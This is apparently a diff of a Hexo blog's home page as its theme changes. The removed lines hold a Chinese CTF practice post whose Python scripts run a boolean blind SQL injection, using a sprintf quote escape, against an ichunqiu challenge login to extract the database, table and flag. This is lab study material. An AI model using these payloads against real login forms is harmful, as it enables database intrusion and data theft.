@@ -1,2334 +1,707 @@
+
+
 <!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
 
 
 
-  
-
-
-<html class="theme-next mist use-motion" lang="en">
 <head>
-  <meta charset="UTF-8"/>
-<script>
-    (function(){
-        if(''){
-            if (prompt('请输入文章密码') !== ''){
-                alert('密码错误');
-                history.back();
-            }
-        }
-    })();
-</script>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="瞎写糊涂账">
-<meta property="og:type" content="website">
-<meta property="og:title" content="renex的杂烩集">
-<meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="renex的杂烩集">
-<meta property="og:description" content="瞎写糊涂账">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="renex">
-<meta name="twitter:card" content="summary">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/"/>
-
-
-
-
-
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="瞎写糊涂账">
+  <meta name="author" content="renex">
+  <meta name="keywords" content="">
   <title>renex的杂烩集</title>
-  
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
 
 
 
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<link  rel="stylesheet" href="/css/main.css" />
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+<!-- 自定义样式保持在最底部 -->
 
-  
-  
-    
-  
 
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
 
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">renex的杂烩集</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle">沉•潜</p>
-      
-  </div>
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
 
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            About
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            Categories
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            Archives
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/21/20-09-21/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/21/20-09-21/" itemprop="url">20-09-21</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-21T08:34:20+08:00">
-                2020-09-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  854 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  5 分钟
-                </span>
-              
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
             </div>
           
-
-          
-
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>象棋（ichuqiu）<br>昨天就做到的题，猫腻在源码里就能找到，js链接是个正则表达式，不过之前一直想着的是用python做，但是只会单线程的我半天没找到答案。<br>今天看wp突然醒悟用bp就挺好的，成功爆破flag</p>
-<hr>
-<p>SQLi(ichunqiu)<br>收获颇多的一道题<br>进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注<br>先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇<a href="https://zhuanlan.zhihu.com/p/115777073" target="_blank" rel="noopener">文章</a><br>应该就是单引号逃逸闭合来注入<br>构造payload:  </p>
-<ul>
-<li>admin%1$\’ or 1=1— 回显password error!</li>
-<li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url &#x3D;  &quot;http:&#x2F;&#x2F;5e2c1c23ad44440f9ba4d92351e69666afb9ede320b748f3.changame.ichunqiu.com&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">dir  &#x3D; string.digits+string.ascii_letters+  &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">right &#x3D;  &quot;password error!&quot;</span><br><span class="line"></span><br><span class="line">#猜数据库长度---3</span><br><span class="line"></span><br><span class="line">for i in range(30):</span><br><span class="line"></span><br><span class="line">	data &#x3D; &#123;&#39;username&#39;:&quot;admin%1$\\&#39; or (length(database())&#x3D;&quot;+str(i)+&quot;)-- &quot;,&#39;password&#39;:&quot;password&quot;&#125;</span><br><span class="line"></span><br><span class="line">	response &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line"></span><br><span class="line">	print(&quot;...&quot;+str(i))</span><br><span class="line"></span><br><span class="line">	if right in response:</span><br><span class="line"></span><br><span class="line">		print(&quot;the length of database_name is&quot;+str(i))</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#爆数据库---ctf</span><br><span class="line"></span><br><span class="line">database_name &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,4):</span><br><span class="line"></span><br><span class="line">	for c in dir:</span><br><span class="line"></span><br><span class="line">		payload &#x3D; &quot;admin%1$\\&#39; or (ascii(substr(database(),&#123;0&#125;,1))&#x3D;&quot;+str(ord(c))+&quot;)-- &quot;</span><br><span class="line"></span><br><span class="line">		data &#x3D; &#123;&#39;username&#39;:payload.format(i),&#39;password&#39;:&quot;password&quot;&#125;</span><br><span class="line"></span><br><span class="line">		response &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line"></span><br><span class="line">		print(payload.format(i)+&quot;...&quot;)</span><br><span class="line"></span><br><span class="line">		if right in response:</span><br><span class="line"></span><br><span class="line">			database_name+&#x3D;c</span><br><span class="line"></span><br><span class="line">			print(&quot;okkkkkkkkkkkkkkkkkkk&quot;+c)</span><br><span class="line"></span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line">print(database_name)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#爆表长度----4</span><br><span class="line">#试着数据库名写成&#39;ctf&#39;发现不行，ctf写成asciihex编码形式0x637466成功注入</span><br><span class="line">#注意使用limit 0,1限定查询</span><br><span class="line"></span><br><span class="line">table_name &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(30):</span><br><span class="line"></span><br><span class="line">	payload &#x3D; &quot;admin%1$\\&#39; or (select length(table_name) from information_schema.tables where table_schema &#x3D; 0x637466 limit 0,1)&#x3D;&quot;+str(i)+&quot;-- &quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; &#123;&#39;username&#39;:payload,&#39;password&#39;:&quot;password&quot;&#125;</span><br><span class="line"></span><br><span class="line">	response &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line"></span><br><span class="line">	print(payload+&quot;...&quot;)</span><br><span class="line"></span><br><span class="line">	if right in response:</span><br><span class="line"></span><br><span class="line">		print(&quot;------------------&quot;+str(i))</span><br><span class="line"></span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#爆表名----flag</span><br><span class="line"></span><br><span class="line">table_name &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,5):</span><br><span class="line"></span><br><span class="line">	for c in dir:</span><br><span class="line"></span><br><span class="line">	payload &#x3D; &quot;admin%1$\\&#39; or ascii(substr((select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1),&#123;0&#125;,1))&#x3D;&quot;+str(ord(c))+&quot;-- &quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; &#123;&#39;username&#39;:payload.format(i),&#39;password&#39;:&quot;password&quot;&#125;</span><br><span class="line"></span><br><span class="line">	response &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line"></span><br><span class="line">	print(payload.format(i)+&quot;...&quot;)</span><br><span class="line"></span><br><span class="line">	if right in response:</span><br><span class="line"></span><br><span class="line">		table_name+&#x3D;c</span><br><span class="line"></span><br><span class="line">		print(&quot;-------------------&quot;+c)</span><br><span class="line"></span><br><span class="line">		break</span><br><span class="line"></span><br><span class="line">print(table_name)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#爆列长度---4</span><br><span class="line"></span><br><span class="line">for i in range(30):</span><br><span class="line"></span><br><span class="line">	payload &#x3D; &quot;admin%1$\\&#39; or (select length(column_name) from information_schema.columns where table_name &#x3D; 0x666c6167 limit 0,1)&#x3D;&quot;+str(i)+&quot;-- &quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; &#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;password&#39;&#125;</span><br><span class="line"></span><br><span class="line">	response &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line"></span><br><span class="line">	print(payload)</span><br><span class="line"></span><br><span class="line">	if right in response:</span><br><span class="line"></span><br><span class="line">		print(&quot;--------------------&quot;+str(i))</span><br><span class="line"></span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#爆列名---flag</span><br><span class="line"></span><br><span class="line">column_name &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,5):</span><br><span class="line"></span><br><span class="line">	for c in dir:</span><br><span class="line"></span><br><span class="line">		payload &#x3D; &quot;admin%1$\\&#39; or ascii(substr((select column_name from information_schema.columns where table_name &#x3D; 0x666c6167 limit 0,1),&#123;0&#125;,1))&#x3D;&quot;+str(ord(c))+&quot;-- &quot;</span><br><span class="line"></span><br><span class="line">		data &#x3D; &#123;&#39;username&#39;:payload.format(i),&#39;password&#39;:&#39;password&#39;&#125;</span><br><span class="line"></span><br><span class="line">		response &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line"></span><br><span class="line">		print(payload.format(i))</span><br><span class="line"></span><br><span class="line">		if right in response:</span><br><span class="line"></span><br><span class="line">			column_name+&#x3D;c</span><br><span class="line"></span><br><span class="line">			print(&quot;------------&quot;+c)</span><br><span class="line"></span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line">print(column_name)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#爆flag</span><br><span class="line">#懒得爆长度了，直接上</span><br><span class="line"></span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in  range(1,100):</span><br><span class="line"></span><br><span class="line">		for c in  dir:</span><br><span class="line"></span><br><span class="line">			payload &#x3D;  &quot;admin%1$\\&#39; or ascii(substr((select flag from flag limit 0,1),&#123;0&#125;,1))&#x3D;&quot;+str(ord(c))+&quot;-- &quot;</span><br><span class="line"></span><br><span class="line">			data &#x3D; &#123;&#39;username&#39;:payload.format(i),&#39;password&#39;:&#39;password&#39;&#125;</span><br><span class="line"></span><br><span class="line">			response &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line"></span><br><span class="line">			print(payload.format(i))</span><br><span class="line"></span><br><span class="line">			if right in response:</span><br><span class="line"></span><br><span class="line">				flag+&#x3D;c</span><br><span class="line"></span><br><span class="line">				print(&quot;------------&quot;+c)</span><br><span class="line"></span><br><span class="line">				break</span><br><span class="line"></span><br><span class="line">		if c &#x3D;&#x3D;  &#39;&#125;&#39;:</span><br><span class="line"></span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-
-          
-        
-      
+      </div>
     </div>
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-md">
+        <div class="py-5" id="board"
+          style=margin-top:0>
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
     
     
-    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/21/20-09-21/">20-09-21</a>
+      </h1>
 
-    
+      <p class="index-excerpt">
+        <a href="/2020/09/21/20-09-21/">
+          
+          
+            
+          
+          象棋（ichuqiu）昨天就做到的题，猫腻在源码里就能找到，js链接是个正则表达式，不过之前一直想着的是用python做，但是只会单线程的我半天没找到答案。今天看wp突然醒悟用bp就挺好的，成功爆破flag
 
-    
+SQLi(ichunqiu)收获颇多的一道题进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password erro
+        </a>
+      </p>
 
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-21 08:34" pubdate>
+              2020-09-21
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
+        
+        
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/20/20-09-20/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/20/20-09-20/">20-09-20</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/20/20-09-20/">
+          
+          
+            
+          
+          悄悄参加了tokyoctf，结果除了签到题就会一个，web全是用python flask框架，完全懵逼。感觉web好难啊，有点受到打击。
+
+GetFlag(ichunqiu)打开链接被正常嘲讽，还是提示了登录可以下载文件获得flag啥的。看源码没有发现有啥问题，登录呗。除了账号密码还有个验证码，每次刷新会变。起初是脚本md5生成验证码加SQL注入，但是先手注尝试admin’— 就直接成功了。。。登
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-20 10:51" pubdate>
+              2020-09-20
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/20/20-09-20/" itemprop="url">20-09-20</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-20T10:51:18+08:00">
-                2020-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  383 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>悄悄参加了tokyoctf，结果除了签到题就会一个，web全是用python flask框架，完全懵逼。感觉web好难啊，有点受到打击。</p>
-<hr>
